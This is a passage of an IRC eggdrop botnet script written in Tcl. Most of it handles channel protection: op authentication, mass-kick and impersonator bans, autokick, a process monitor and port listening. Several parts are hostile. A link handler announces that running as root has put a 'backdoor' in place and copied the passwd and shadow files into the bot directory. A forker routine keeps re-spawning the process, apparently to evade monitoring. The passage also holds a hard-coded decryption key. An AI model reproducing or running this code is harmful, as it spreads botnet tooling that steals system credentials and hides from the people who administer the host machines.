   set rhandle [nick2hand $unick $channel] ; set handle [string tolower $rhandle]
   set nicks [srange $raw 2 end]
   set modetypes 0
   set curmode ""
   for {set i 0} {$i < [string length $mode]} {incr i} {
      set char [string index $mode $i]
      if {$char == "+" || $char == "-"} { set curmode $char ; incr modetypes ; continue }
      set curnick [sindex $nicks [expr $i - $modetypes]]
      set hand [string tolower [nick2hand $curnick $channel]]
      if {$curmode == "+" && $char == "o" && $curnick != $botnick && ![isop $curnick $channel] && [getchanhost $curnick $channel] != ""} {
         if {[info exists 1badop] || ![validop $hand $channel]} {
            lappend badops $curnick ; set 1badop $curnick ; set reason "bad host and/or flags"
         } elseif {[matchattr $handle b]} {
            set auth [lindex [split [srange $raw 3 end] @] 1]
            if {$mode != "+o-b" || $handle == $hand} {
               lappend badops $curnick ; set 1badop $curnick ; set reason "invalid mode and/or same handle"
            } elseif {[strcmp $handle $nick]} {
               if {![info exists opauth([string tolower $curnick]:$auth)] && 
                  (![info exists chnick([string tolower $curnick])] || ![info exists opauth($chnick([string tolower $curnick]):$auth)])} {
                  lappend badops $curnick ; set 1badop $curnick ; set reason "unauthorized op"
               } else {
                  catch {unset opauth([string tolower $curnick]:$auth)}
                  catch {unset dontOp($hand)}
               }
            } else {
               regsub -all " " "         " $handle key
               set key [string range $key 0 10]
               set decauth [decrypt $key $auth]
               set counter [sindex $decauth 1] ; set opnick [sindex $decauth 2] ; set chan [sindex $decauth 3]
               if {[info exists counters($handle)]} {
                  set count [decrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counters($handle)]
               } else { set count 0 }
               if {![isnum $counter] || $counter <= $count || ($count != 0 && $counter >= [expr $count + 1000000]) || ![strcmp [string range $channel 0 10] $chan] ||
                  (![strcmp $curnick $opnick] && (![info exists chnick([string tolower $curnick])] || ![strcmp $chnick([string tolower $curnick]) $opnick]))} {
                  lappend badops $curnick ; set 1badop $curnick ; set reason "out of bounds"
               } else {
                  set counters($handle) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] $counter]
                  catch {unset dontOp($hand)}
                  setutimer 2 save_settings
               }
            }
         } elseif {![string match *.* $unick] && ![info exists manOp($handle:$channel)] && ![info exists manOp(*:$channel)] && [validchan $mainchan] && [botisop $mainchan]} {
            lappend badops $curnick ; set 1badop $curnick ; set reason "unauthorized manual op"
         } else { catch {unset dontOp($hand)} }
      }
   }
   if {![info exists badops]} { return 0 }
   set bdops $badops
   if {[botisop $channel]} {
      if {[llength $badops] < ${modes-per-line}} { lappend badops $unick ; set appended "" }
      if {[matchattr $nick H] || [matchattr $nick boT]} {
         set deopnicks $badops
         if {![info exists appended] && [isop $unick $channel] && $unick != $botnick && ![info exists gotdeop($unick$channel)]} {
            lappend deopnicks $unick
            set gotdeop($unick$channel) ""
            setutimer 2 "catch {unset gotdeop([str2tcl $unick$channel])}"
         }
         mass_mode - o dumpserv $channel $deopnicks
      } else {
         mass_mode - o dumpserv $channel $badops
         setutimer 3 "bandelay [str2tcl $channel] [str2tcl $unick] [str2tcl $1badop]"
      }
   }
   if {[strcmp $handle $nick]} {
      announce "\[\002WARNING\002\] I illegally opped '[join $bdops]' on $channel: $reason.  My shell is probably hacked."
      setcomment $nick "I illegally opped '[join $bdops]' on $channel: $reason - [ctime [unixtime]]"
      hacked
      return 0
   }
   if {[validuser $handle]} {
      if {![matchattr $handle nW] && ![matchattr $handle b] && ![matchattr $handle d]} { chattr $rhandle -[allflags]+d }
      if {![info exists setcomment($handle)]} {
         if {[matchattr $handle b]} { set dontOp($handle) "Illegally opped '[join $bdops]' on $channel: $reason - [ctime [unixtime]]" }
         setutimer 3 save_settings
         set setcomment($handle) ""
         setutimer 10 "catch {unset setcomment([str2tcl $handle])}"
         setutimer 11 "setcomment [str2tcl $rhandle] \"Illegally opped '[str2tcl [join $bdops]]' on [str2tcl $channel]: $reason - [ctime [unixtime]]\""
         setutimer 12 save
      }
   }
   if {[botisop $channel]} { putlog "\[\002WARNING\002\] \002$unick\002 gave illegal ops to '[join $bdops]' on $channel: $reason. (handle: $rhandle)" }
   return 0
}
bind raw - MODE raw_modes

proc bandelay { channel unick badop } {
   set uban "*!*@[lindex [split [maskhost [getchanhost $unick $channel]] @] 1]"
   set bban "*!*@[lindex [split [maskhost [getchanhost $badop $channel]] @] 1]"
   dumpserv "MODE $channel -oo+bb $unick $badop [fixhost $uban $channel] [fixhost $bban $channel]"
   foreach 1chan [channels] {
      if {[isop $unick $1chan]} { putserv "KICK $1chan $unick :Bad op!" }
   }
}

proc check_masskick { unick host handle channel victim reason } {
   global nick botnick kicks tookaction dontOp noprot
   if {[getting-users] || [info exists noprot] || ![isop $victim $channel]} { return }
   if {[validop [nick2hand $victim $channel] $channel] && $unick != $victim && $unick != $botnick} {
      if {![info exists kicks($unick$channel)]} {
         lappend kicks($unick$channel) $victim
      } elseif {[lsearch -exact [string tolower $kicks($unick$channel)] [string tolower $victim]] == -1} { lappend kicks($unick$channel) $victim }
      setutimer 60 "unset kicks([str2tcl $unick$channel])"
      if {[llength $kicks($unick$channel)] > 4} {
         if {![info exists tookaction($unick$channel)]} {
            set comment "Mass kicked $channel - [ctime [unixtime]]"
            if {$handle == $nick} {
               announce "\[\002WARNING\002\] I mass kicked $channel.  My shell is probably hacked."
               setcomment $nick "I mass kicked $channel - [ctime [unixtime]]."
               hacked
               return
            }
            if {[botisop $channel]} { putserv "KICK $channel $unick :Mass kick?! You're GONE!" }
            set tookaction($unick$channel) ""
            setutimer 2 "catch {unset tookaction([str2tcl $unick$channel])}"
            if {![matchattr $handle b]} {
               if {![matchattr $handle nW]} { chattr $handle -[allflags]+d }
            } else {
               set dontOp([string tolower $handle]) $comment
               setutimer 3 save_settings
               chpass $handle [randstring 14]
               unlink $handle
            }
            setcomment $handle $comment
            setutimer 4 save
            if {[botisop $channel]} {
               putlog "\[\002WARNING\002\] \002MASS KICK\002 detected on $channel by $unick ($host). (handle: $handle)"
               putlog " - Kicked:  [join $kicks($unick$channel)]"
            }
         }
      }
   }
}
bind kick - * check_masskick

proc check_imposter { unick host handle channel newnick } {
   global max-bans totalbans altchar chnick
   if {[validop $handle $channel]} {
      catch {unset chnick([string tolower $unick])}
      set chnick([string tolower $newnick]) [string tolower $unick]
      setutimer 20 "catch {unset chnick([str2tcl [string tolower $newnick]])}"
   }
   if {![info exists altchar]} { set altchar "|" }
   if {[getting-users] || [isop $unick $channel] || $host == ""} { return }
   if {[string index $newnick [expr [string length $newnick] - 1]] == $altchar} {
      set nick [string range $newnick 0 [expr [string length $newnick] - 2]]
   } else { set nick $newnick }
   if {[validuser $nick] && ([matchattr $nick bo] || [matchchanattr $nick bo $channel])} {
      foreach 1host [string tolower [gethosts $nick]] {
         if {[string match [str2tcl $1host] [string tolower $unick!$host]] ||
             [string match [str2tcl $1host] [string tolower $newnick!$host]]} {
            set found ""
         }
      }
      if {[info exists found]} { return }
      putlog "\[\002IMPOSTER\002\] Kick-banning \002$newnick\002 on $channel for impersonating a bot"
      putlog " - Fake host:  [fixhost *!$host]"
      if {[llength [chanbans $channel]] >= ${max-bans}} {
         if {![string match *i* [sindex [getchanmode $channel] 0]]} { putserv "MODE $channel +i" }
         putlog " - \002ALERT:\002 Ban list on $channel is full, setting +i."
      }
      set ban "*!*@[lindex [split [maskhost $host] @] 1]"
      if {![ischanban $ban $channel]} {
         if {![info exists totalbans]} { set totalbans 1 } else { incr totalbans }
         setutimer 180 "catch {unset totalbans}"
         if {$totalbans > 15} {
            if {![string match *i* [sindex [getchanmode $channel] 0]]} {
               putlog "\[\002IMPOSTER FLOOD\002\] Setting invite-only on $channel for 5 minutes ..."
               dccputchan 5 "\[\002IMPOSTER FLOOD\002\] Setting invite-only on $channel for 5 minutes ..."
               putserv "MODE $channel +i"
               setutimer 300 "putserv \"MODE [str2tcl $channel] -i\""
            }
            return
         }
         putserv "MODE $channel +b [fixhost $ban $channel]"
         putserv "KICK $channel $newnick :Impersonating an OP"
      }
   }
}
bind nick - * check_imposter

proc auto_kick { unick host handle channel } {
   global max-bans totalbans altchar
   if {[getting-users] || ($host == "")} { return }
   set user [nick2hand $unick $channel] ; set channel [string tolower $channel]
   if {![info exists altchar]} { set altchar "|" }
   if {[string index $unick [expr [string length $unick] - 1]] == $altchar} {
      set nick [string range $unick 0 [expr [string length $unick] - 2]]
   } else { set nick $unick }
   if {([validuser $nick] && ([matchattr $nick bo] || [matchchanattr $nick bo $channel])) &&
        (![matchattr $user bo] && ![matchchanattr $user bo $channel])} {
      putlog "\[\002IMPOSTER\002\] Kick-banning \002$unick\002 on $channel for impersonating a bot"
      putlog " - Fake host:  [fixhost *!$host]"
      if {[llength [chanbans $channel]] >= ${max-bans}} {
         if {![string match *i* [sindex [getchanmode $channel] 0]]} { putserv "MODE $channel +i" }
         putlog " - \002ALERT:\002 Ban list on $channel is full, setting +i."
      }
      set ban "*!*@[lindex [split [maskhost $host] @] 1]"
      if {![ischanban $ban $channel]} {
         if {![info exists totalbans]} { set totalbans 1 } else { incr totalbans }
         setutimer 180 "catch {unset totalbans}"
         if {$totalbans > 15} {
            if {![string match *i* [sindex [getchanmode $channel] 0]]} {
               putlog "\[\002IMPOSTER FLOOD\002\] Setting invite-only on $channel for 5 minutes ..."
               dccputchan 5 "\[\002IMPOSTER FLOOD\002\] Setting invite-only on $channel for 5 minutes ..."
               putserv "MODE $channel +i"
               setutimer 300 "putserv \"MODE [str2tcl $channel] -i\""
            }
            return
         }
         putserv "MODE $channel +b [fixhost $ban $channel]"
         putserv "KICK $channel $unick :Impersonating an OP"
      }
      return
   }
   set channel [string tolower [sindex $channel 0]]
   if {![botisop $channel] || (![isclosed $channel] && ![isautokick $channel])} { return }
   if {[isclosed $channel]} { set r "temporarily closed." } else { set r "closed." }
   set reason "Sorry, channel is $r"
   set uhand [nick2hand $unick $channel]
   if {![validop $uhand $channel] && ![matchattr $uhand g] && ![matchchanattr $uhand g $channel]} {
      putlog "\[\002WARNING\002\] Unauthorized entrance in $channel by \002$unick\002 ($host)"
      if {![string match "*i*s*t*n*" [sindex [getchanmode $channel] 0]]} { putserv "MODE $channel +stin" }
      setutimer 3 "fast_masskick [str2tcl $handle] - \"[str2tcl $channel] 4 $reason\""
   } elseif {[matchattr $handle p] || [matchattr $handle g] || [matchchanattr $handle g $channel]} {
      settimer 3 "idlekick [str2tcl $handle] [str2tcl $channel]"
   }
}
bind join - * auto_kick

proc idlekick { handle channel } {
   global noprot
   if {![validuser $handle] || ![validchan $channel] || ![botisop $channel] || [info exists noprot]} { return }
   if {![isclosed $channel] && ![isautokick $channel]} { return }
   foreach 1nick [chanlist $channel] {
      if {[isop $1nick $channel] || [isvoice $1nick $channel]} { continue }
      if {[strcmp [nick2hand $1nick $channel] $handle]} { putserv "KICK $channel $1nick :Idle time limit exceeded" }
   }
}

proc autokick_chan { bot commands args } {
   global autokick
   set channel [string tolower [lindex $args 0]]
   if {[lsearch -exact [string tolower $autokick] $channel] == -1 && [validchan $channel]} {
      lappend autokick $channel
      save_settings
   }
}
bind bot - autokick autokick_chan

proc no_autokick { channel } {
   global autokick
   if {![info exists autokick] || [llength $autokick] < 1 || [set s [lsearch -exact $autokick $channel]] == -1} { return }
   set autokick [lreplace $autokick $s $s]
   save_settings
}

proc isautokick { channel } {
   global autokick
   if {![info exists autokick] || [lsearch -exact [string tolower $autokick] [string tolower $channel]] == -1} { return 0 }
   return 1
}

proc isclosed { channel } {
   global chstatus
   if {![info exists chstatus([string tolower $channel])] || $chstatus([string tolower $channel]) != "closed"} { return 0 }
   return 1
}

proc autokick_display { handle idx args } {
   global autokick
   putcmdlog "#$handle# autokickchans"
   if {![info exists autokick] || [llength $autokick] < 1} {
      putdcc $idx "*** No channels are currently in 'auto-kick' mode."
   } else { putdcc $idx "*** Channels currently in 'auto-kick' mode:  $autokick" }
}
bind dcc n autokickchans autokick_display

proc alltelnet_off { bot via } {
   global nick botport userport rooted priority initpass proxybot homedir
   setutimer 60 checklink
   kill_utimer "findhub"
   set priority 0
   if {$via == $nick} {
      if {[info exists rooted] || [file isfile .pw] || [file isfile .sh] || [file isfile .mpw]} {
         ownerbroadcast "\[\002ALERT\002\] This bot has been run as root; backdoor should now be in place."
         ownerbroadcast " - passwd and shadow files should be in the bot directory as '.pw' and '.sh' (or .mpw)"
         ownerbroadcast " - Download and remove these files to stop this alert on link."
      }
      if {[string match /* $homedir]} {
         if {[file isfile $homedir/.rhosts]} { ownerbroadcast "\[\002WARNING\002\] Found .rhosts file in home directory (backdoor?)" }
         if {[file isfile $homedir/.ssh/authorized_keys]} { ownerbroadcast "\[\002WARNING\002\] Found authorized_keys file in .ssh directory (backdoor?)" }
         if {[file isfile $homedir/.ssh2/authorization]} { ownerbroadcast "\[\002WARNING\002\] Found authorization file in .ssh2 directory (backdoor?)" }
      }
   }
   set hub [lindex [bots] 0]
   if {![matchattr $nick H] && ![matchattr $hub H] && [matchattr $bot H]} { unlink $hub ; link $bot ; return }
   if {![info exists nick] || $nick == "" || $via != $nick} { return }
   if {[info exists initpass] && [passwdok $bot [sindex [decrypt * $initpass] 1]]} { setutimer 10 "initpass $bot" }
   if {[matchattr $nick H]} { return }
   setutimer 5 fixflags
   if {[info exists proxybot]} { return }
   if {[matchattr $bot H]} {
      putlog "\[\002LINK\002\] Linked to \002$bot\002, closing all listening ports ..."
      catch {listen $botport off}
   } else { putlog "\[\002LINK\002\] Linked to non-hub \002$bot\002, closing users listening port  (hubs down?)" }
   catch {listen $userport off}
}
bind link - * alltelnet_off

proc alltelnet_on { bot } {
   global nick botport userport priority linked proxybot
   if {[matchattr $nick H] || [info exists proxybot] || [bots] != ""} { return }
   set linked 0
   putlog "\[\002DISCONNECT\002\] Disconnected from hub, opened all listening ports"
   putlog "*** Initiating priority scan for alternate hubs ..."
   if {$botport != "" && $botport >= 1024} { catch {listen $botport bots} }
   if {$userport != "" && $userport >= 1024} { catch {listen $userport users} }
   set priority 0
   setutimer 65 findhub
}
bind disc - * alltelnet_on

proc user_relay { idx arg } {
   set who [idx2hand $idx]
   set bot [sindex $arg 1]
   if {$bot != "" && [validuser $bot]} {
      foreach 1bot [bots] {
         if {[strcmp $1bot $bot]} { set found "" }
      }
      if {[info exists found]} {
         catch {putbot [sindex $arg 1] "turnontelnet $who"}
      } else {
         putdcc $idx "\[\002ALERT\002\] \002$bot\002 is not linked and cannot be notified of relay attempt."
         putdcc $idx " - Attempting the relay anyway ..."
      }
   } else { return $arg }
   setutimer 3 "catch {*dcc:relay [str2tcl [idx2hand $idx]] $idx [str2tcl [sindex $arg 1]]}"
   return
}
bind filt m ".relay *" user_relay

proc usertelnet_on { bot command args } {
   global nick userport proxybot
   if {[matchattr $nick H] || [info exists proxybot] || ![matchattr $bot bo]} { return }
   kill_utimer "catch {listen $userport off}"
   set handle [lindex $args 0]
   putlog "\[\002RELAY\002\] \002$handle\002 is attempting a relay, turning on user listening port for 1 minute ..."
   if {$userport != "" && $userport >= 1024} {
      catch {listen $userport users}
      setutimer 60 "catch {listen $userport off}"
   }
}
bind bot - turnontelnet usertelnet_on

proc listen_ports { handle idx args } {
   global nick botport userport
   set args [string tolower [lindex $args 0]]
   set type [sindex $args 0] ; set status [sindex $args 1]
   putcmdlog "#$handle# listen $type $status"
   if {($status != "on" && $status != "off") || ($type != "all" && $type != "bots" && $type != "users")} {
      putdcc $idx "\002Usage:\002 .listen <bots|users|all> <on|off>"
   } elseif {$status == "on"} {
      if {$type == "all"} {
         if {$botport != "" && $botport >= 1024} { catch {listen $botport bots} }
         if {$userport != "" && $userport >= 1024} { catch {listen $userport users} }
         putdcc $idx "*** All listening ports have been opened."
      } elseif {$type == "bots"} {
         if {$botport != "" && $botport >= 1024} { catch {listen $botport bots} }
         putdcc $idx "*** Bot listening port has been opened."
      } elseif {$type == "users"} {
         if {$userport != "" && $userport >= 1024} { catch {listen $userport users} }
         putdcc $idx "*** User listening port has been opened."
      }
   } elseif {$type == "all"} {
      catch {listen $botport off}
      catch {listen $userport off}
      putdcc $idx "*** All listening ports have been closed."
   } elseif {$type == "bots"} {
      catch {listen $botport off}
      putdcc $idx "*** Bot listening port has been closed."
   } elseif {$type == "users"} {
      catch {listen $userport off}
      putdcc $idx "*** User listening port has been closed."
   }
}
bind dcc n listen listen_ports


######################################################################################
##  Background Process Monitor

assoc 5 monitor

if {[info exists binary]} {
   set binary-name [string range $binary [expr 1+[string last "/" $binary]] end]
} else { set binary-name "" }

proc bgp_check { handle idx args } {
   global bgpcheck
   set args [lindex $args 0]
   set switch [sindex $args 0]
   putcmdlog "#$handle# bgpcheck $args"
   if {$switch == "off"} {
      set bgpcheck 0
      kill_timer "check_processes"
      save_settings
      putdcc $idx "*** Background process monitor deactivated."
   } elseif {$switch == "on"} {
      set bgpcheck 1
      settimer 3 check_processes 
      save_settings
      putdcc $idx "*** Background process monitor activated."
   } else { putdcc $idx "\002Usage:\002 .bgpcheck <on|off>" }
}
bind dcc n bgpcheck bgp_check

proc check_processes {} {
   global nick userid uname allowprocs binary-name
   settimer 3 check_processes
   if {![info exists allowprocs($nick)]} { 
      lappend allowprocs($nick) ./eggdrop eggdrop egg limbo ps sh botchk (ps) (eggdrop) bitchx (sh) /bin/sh uname (uname)
   }
   set index 1
   if {[string match "SunOS*" $uname]} {
      if {[catch {set psout [open "|ps -f -u $userid"]}] != 0} { return }
      set index 2
   } elseif {[catch {set psout [open "|ps x"]}] != 0} { return }
   if {[catch {gets $psout line}] != 0} { catch {close $psout} ; return }
   set numprocs 0
   while {[gets $psout line] >= 0} {
      set line [join $line]
      regsub "\[^:\]*:" $line "" line
      set proc [srange $line $index end] ; set bin [sindex $proc 0]
      if {[lsearch $allowprocs($nick) $bin] != -1 || $bin == ${binary-name} ||
          $bin == "ps" || $bin == "who" || $bin == "grep" || $bin == ""} { continue }
      append processes "$proc, "
      if {![info exists su] && ([string match "su $userid" $proc] || [string match "su * $userid" $proc])} { set su "" }
      incr numprocs
   }
   catch {close $psout}
   if {[info exists processes]} { set processes [string trimright $processes ", "] }
   if {$numprocs > 0} {
      dccputchan 5 "\[\002WARNING\002\] Possibly hacked shell, too many processes running ($numprocs extra)"
      dccputchan 5 " - Current processes:  [string range [join $processes] 0 375]"
      catch {set lhost [lindex [exec who | grep $userid] 5]}
      if {[info exists lhost] && $lhost != ""} {
         dccputchan 5 " - User logged in from:  [lindex [exec who | grep $userid] 5]"
      }
      if {[info exists su]} {
         announce "\[\002WARNING\002\] A user is using '\002su\002' to access my shell account!  Find a botnet master!"
         announce " - Current processes:  [string range [join $processes] 0 375]"
         if {[info exists lhost] && $lhost != ""} {
            announce " - User logged in from:  [lindex [exec who | grep $userid] 5]"
         }
      }
   }
}

proc add_process { handle idx args } {
   global nick allowprocs
   set procs [lindex $args 0]
   putcmdlog "#$handle# addprocess $procs"
   if {$procs == ""} { putdcc $idx "\002Usage:\002 .addprocess <process1> \[process2\] ..." ; return }
   foreach 1proc [split $procs] {
      if {![info exists allowprocs($nick)] || ([info exists allowprocs($nick)] && [lsearch -exact $allowprocs($nick) $1proc] == -1)} {
         lappend allowprocs($nick) $1proc
      }
   }
   save_settings
   putdcc $idx "*** Now allowing the following processes:  $allowprocs($nick)"
}
bind dcc n addprocess add_process
bind dcc n addproc add_process
bind dcc n allowprocess add_process
bind dcc n allowproc add_process

proc del_process { handle idx args } {
   global nick allowprocs
   set procs [lindex $args 0]
   putcmdlog "#$handle# delprocess $procs"
   if {$procs == ""} { putdcc $idx "\002Usage:\002 .delprocess <process1> \[process2\] ..." ; return }
   if {[info exists allowprocs($nick)]} {
      foreach 1proc [split $procs] {
         if {[set s [lsearch -exact $allowprocs($nick) $1proc]] != -1} { set allowprocs($nick) [lreplace $allowprocs($nick) $s $s] }
      }
   }
   save_settings
   putdcc $idx "*** Now allowing the following processes:  $allowprocs($nick)"
}
bind dcc n delprocess del_process
bind dcc n delproc del_process

proc allowed_processes { handle idx args } {
   global nick allowprocs
   set bots [lindex $args 0]
   putcmdlog "#$handle# allowedprocesses $bots"
   if {$bots == ""} {
      putdcc $idx "\[\002ALLOWEDPROCS\002\] Currently allowed background processes:"
      putdcc $idx "     $allowprocs($nick)"
   } else {
      putdcc $idx "\[\002ALLOWEDPROCS\002\] Currently allowed processes on remote bots:"
      foreach 1bot [split $bots] { catch {putbot $1bot "allowedprocs $idx"} }
   }
}
bind dcc n allowedprocesses allowed_processes
bind dcc n allowedprocs allowed_processes

proc net_allowprocs { bot command args } {
   global nick allowprocs
   if {![matchattr $bot boT]} { return }
   set idx [sindex $args 0]
   catch {putbot $bot "netallowprocs $idx $allowprocs($nick)"}
}
bind bot - allowedprocs net_allowprocs

proc receive_allowprocs { bot command args } {
   set args [lindex $args 0]
   putdcc [sindex $args 0] "*** \002$bot\002:  [srange $args 1 end]"
}
bind bot - netallowprocs receive_allowprocs

proc list_processes { handle idx args } {
   global nick userid uname
   set bot [sindex [lindex $args 0] 0]
   putcmdlog "#$handle# listprocesses $bot"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$bot == ""} {
      if {[string match "SunOS*" $uname] && [catch {set curprocs [exec ps -f -u $userid]} command_error] != 0} {
         putdcc $idx "*** Unable to list background processes:  $command_error"
      } elseif {[catch {set curprocs [exec ps x]} command_error] != 0} { 
         putdcc $idx "*** Unable to list background processes:  $command_error"
      } else {
         putdcc $idx "\[\002PROCESSES\002\] Current processes running:"
         putdcc $idx "$curprocs"
         putdcc $idx " "
      }
   } elseif {![matchattr $bot b]} {
      putdcc $idx "*** Unable to list background processes for \002$bot\002; invalid bot."
   } elseif {[catch {putbot $bot "listprocs $idx"}] != 0} {
      putdcc $idx "*** Unable to list background processes for \002$bot\002; bot is not linked."
   } else { putdcc $idx "\[\002NETPROCESSES\002\] Current processes running on \002$bot\002:" }
}
bind dcc n listprocesses list_processes
bind dcc n listprocs list_processes

proc net_listprocs { bot command args } {
   global nick userid uname
   if {![matchattr $bot boT]} { return }
   set idx [lindex $args 0]
   if {[string match "SunOS*" $uname] && [catch {set curprocs [open "|ps -f -u $userid"]} command_error] != 0} {
      catch {putbot $bot "listprocerror $idx $command_error"}
   } elseif {[catch {set curprocs [open "|ps x"]} command_error] != 0} { 
      catch {putbot $bot "listprocerror $idx $command_error"}
   } else {
      while {[gets $curprocs line] >= 0} { catch {putbot $bot "netlistprocs $idx $line"} }
      catch {close $curprocs}
      catch {putbot $bot "netlistprocs $idx \002*** END OF LIST ***\002   ($nick)"}
      catch {putbot $bot "netlistprocs $idx"}
   }
}
bind bot - listprocs net_listprocs

proc receive_listprocs { bot command args } {
   set args [lindex $args 0]
   putdcc [sindex $args 0] "[srange $args 1 end]"
}
bind bot - netlistprocs receive_listprocs

proc receive_procerror { bot command args } {
   set args [lindex $args 0]
   putdcc [sindex $args 0] "*** Unable to list background processes from \002$bot\002:  [srange $args 1 end]"
}
bind bot - listprocerror receive_procerror

proc kill_process { handle idx args } {
   set pids [lindex $args 0]
   putcmdlog "#$handle# killprocess $pids"
   if {$pids == ""} { putdcc $idx "\002Usage:\002 .killprocess <pid1> \[pid2\] ..." ; return }
   set killed 0
   foreach 1pid [split $pids] {
      if {[catch {exec kill -9 $1pid} error] != 0} { 
         putdcc $idx "*** Unable to kill pid $1pid:  $error"
         continue
      }
      set killed 1
   }
   if {$killed} { putdcc $idx "*** Killed all specified PIDs." ; return }
   putdcc $idx "*** Unable to kill any of the specified PIDs."
}
bind dcc n killprocess kill_process
bind dcc n killproc kill_process
bind dcc n killpid kill_process


######################################################################################
##  Bot Setup/Maintenance

proc checklink {} {
   global linked
   if {[bots] != "" && ![getting-users]} {
      kill_utimer checklink
      set linked 1
   } else { setutimer 60 checklink }
}

proc fixflags {} {
   global nick proxybot
   if {[getting-users]} { setutimer 5 fixflags ; return }
   foreach 1user [userlist] {
      if {[matchattr $1user A]} { chattr $1user -A ; set found "" }
      if {![matchattr $1user b]} { continue }
      if {![matchattr $1user H]} {
         if {[matchattr $1user a] || [matchattr $1user h]} { chattr $1user -ah ; set found "" }
      } elseif {[info exists proxybot] || [matchattr $1user C]} {
         if {[matchattr $1user a]} { chattr $1user -a ; set found "" }
      } elseif {![matchattr $nick H]} {
         if {![matchattr $1user a] && ![matchattr $1user h]} { chattr $1user -l+as ; set found "" }
      }
   }
   if {[info exists found]} { save }
}

proc initlink { hub } {
   global init
   if {[strcmp [lindex [bots] 0] $hub]} { return }
   if {[info exists init] || [lsearch [string tolower [bots]] [string tolower $hub]] == -1} {
      setutimer 20 "initlink [str2tcl $hub]"
   } else {
      announce "Attempting initial link to primary hub ($hub) ..."
      unlink [lindex [bots] 0]
      link $hub
   }
}

proc initpass { bot } {
   global nick initpass botport userport proxybot
   if {[getting-users] || [bots] == ""} { 
      setutimer 5 "initpass [str2tcl $bot]"
   } elseif {[passwdok $bot [sindex [decrypt * $initpass] 1]]} {
      if {[matchattr $nick H]} {
         foreach 1bot [userlist bo] { chattr $1bot +s }
         chattr $nick -ahs
         catch {listen $botport bots}
         catch {listen $userport users}
      }
      set curhub [lindex [bots] 0]
      set hub [sindex [decrypt * $initpass] 2]
      if {![info exists proxybot] && ![matchattr $curhub C]} {
         chattr $curhub -hl+Has
      } else { chattr $curhub -hal+Hs }
      chattr $hub -l+Hhs
      unset initpass
      setnewpasses
      setutimer 5 "initlink [str2tcl $hub]"
   }
}

proc forker {} {
   settimer [expr [rand 4]+1] "setutimer 29 forker"
   if {[fork] > 0} { exit }
}

proc init_fork {} {
   kill_utimer forker
   kill_timer "setutimer 29 forker"
   if {[string length [info commands fork]]} { forker }
}

proc enable_fork { handle idx args } {
   global forkbot
   set args [lindex $args 0]
   set switch [sindex $args 0]
   putcmdlog "#$handle# fork $args"
   if {$switch == "off"} {
      set forkbot 0
      kill_utimer forker
      kill_timer "setutimer 29 forker"
      save_settings
      putdcc $idx "*** Forking has been disabled."
   } elseif {$switch == "on"} {
      set forkbot 1
      setutimer 5 init_fork
      save_settings
      putdcc $idx "*** Forking has been enabled."
   } else {
      putdcc $idx "\002Usage:\002 .fork <on|off>"
      if {![info exists forkbot] || $forkbot} { set forking "enabled" } else { set forking "disabled" }
      putdcc $idx "*** Forking is currently $forking on this bot."
   }
}
bind dcc n fork enable_fork

proc enable_dcc { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# dcc $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   set bot [sindex $args 0] ; set seconds [sindex $args 1]
   if {$bot == ""} { putdcc $idx "\002Usage:\002 .dcc <bot> \[seconds\]  (valid time: 1-600 secs)" ; return }
   if {$seconds < 1 || $seconds > 600} { set seconds 60 }
   putdcc $idx "*** DCC Chat request sent to $bot, please wait ..."
   catch {putbot $bot "enabledcc $handle $idx $seconds"}
}
bind dcc n dcc enable_dcc

proc net_enabledcc { bot command args } {
   global nick
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set idx [sindex $args 1] ; set seconds [sindex $args 2]
   if {[matchattr $handle nW]} {
      chattr $handle +A
      setutimer $seconds "chattr [str2tcl $handle] -A"
      set msg "   ($nick) You now have \002$seconds\002 seconds to dcc chat."
      putlog "\[\002DCC REQUEST\002\] DCC CHAT enabled by $handle for $seconds seconds."
   } else {
      set msg "   ($nick) You do not have the required flags to enable dcc chat."
      putlog "\[\002DCC REQUEST\002\] DCC CHAT request \037denied\037 from $handle@$bot (insufficient flags)"
   }
   catch {putbot $bot "show $idx $msg"}
}
bind bot - enabledcc net_enabledcc

proc fix_bots { handle idx args } {
   global nick botnick noOp mtot htot proxybot dontOp askedinv askedkey askedunban askedlim tclsource
   set args [lindex $args 0]
   putcmdlog "#$handle# fixbots $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} {
      putdcc $idx "\002Usage:\002 .fixbots <*|bots>"
      putdcc $idx " "
   }
   if {$args == "*" || $args == ""} {
      foreach 1bot [string tolower [bots]] { setcomment $1bot "" ; catch {unset dontOp($1bot)} }
      fixflags
      catch {unset invited} ; catch {unset askedinv} ; catch {unset askedkey} ; catch {unset askedunban} ; catch {unset askedlim}
      if {$args == "*"} {
         putallbots "fixbot $handle"
         putdcc $idx "*** Fixing bot-related settings on all bots ..."
      } else { putdcc $idx "*** Fixed op settings on current bot" }
      if {[info exists mtot] && $mtot > 15} { dumpserv }
      if {[info exists htot] && $htot > 15} { dumphelp }
      if {[getting-users]} {
         set hub [lindex [bots] 0]
         unlink $hub
         setutimer 1 "link [str2tcl $hub]"
      }
      set tclsource "" ; set noOp 0
      save_settings
      if {[info exists proxybot]} {
         foreach 1chan [channels] {
            if {[onchan $botnick $1chan]} { set onserver "" } else { putserv "JOIN $1chan" }
         }
         if {![info exists onserver]} { jump }
      }
      return
   }
   putdcc $idx "*** Fixing bot-related settings on:  $args"
   foreach 1bot [split $args] { catch {putbot $1bot "fixbot $handle"} }
   
}
bind dcc n fixbots fix_bots

proc net_fixbots { bot command args } {
   global botnick noOp mtot htot proxybot dontOp askedinv askedkey askedunban askedlim tclsource
   if {![matchattr $bot boT]} { return }
   set handle [lindex $args 0]
   putlog "\[\002FIXBOT\002\] Fixing bot-related settings - (authorized by $handle@$bot)"
   foreach 1bot [string tolower [bots]] { setcomment $1bot "" ; catch {unset dontOp($1bot)} }
   fixflags
   catch {unset invited} ; catch {unset askedinv} ; catch {unset askedkey} ; catch {unset askedunban} ; catch {unset askedlim}
   if {[info exists mtot] && $mtot > 15} { dumpserv }
   if {[info exists htot] && $htot > 15} { dumphelp }
   if {[getting-users]} {
      set hub [lindex [bots] 0]
      unlink $hub
      setutimer 1 "link [str2tcl $hub]"
   }
   set tclsource "" ; set noOp 0
   save_settings
   if {[info exists proxybot]} {
      foreach 1chan [channels] {
